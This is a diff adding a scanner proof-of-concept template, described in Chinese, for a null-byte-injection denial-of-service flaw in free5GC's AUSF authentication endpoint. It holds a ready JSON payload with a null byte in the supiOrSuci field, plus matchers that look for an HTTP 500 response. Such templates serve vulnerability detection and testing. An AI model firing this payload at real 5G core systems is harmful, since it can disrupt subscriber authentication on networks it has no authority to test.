@@ -1,0 +1,40 @@
+[info]
+author = "ave"
+description = "向 free5GC AUSF 的 /nausf-auth/v1/ue-authentications 端点发送包含空字节的 supiOrSuci 字段的 JSON 请求，验证是否返回 HTTP 500 内部错误。若返回 500 则表明存在空字节注入导致的拒绝服务漏洞。"
+id = "POC-AVE-2026-0772"
+name = "free5GC AUSF null byte injection DoS PoC"
+severity = "medium"
+tags = ["ave-2026-0772"]
+vuln_id = [
+    "CVE-2026-53551",
+    "AVE-2026-0772",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/nausf-auth/v1/ue-authentications"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"supiOrSuci":"imsi-001010000000001\x00","servingNetworkName":"5G:mnc001.mcc001.3gppnetwork.org"}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [500]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "System failure",
+    "500 Internal Server Error",
+]
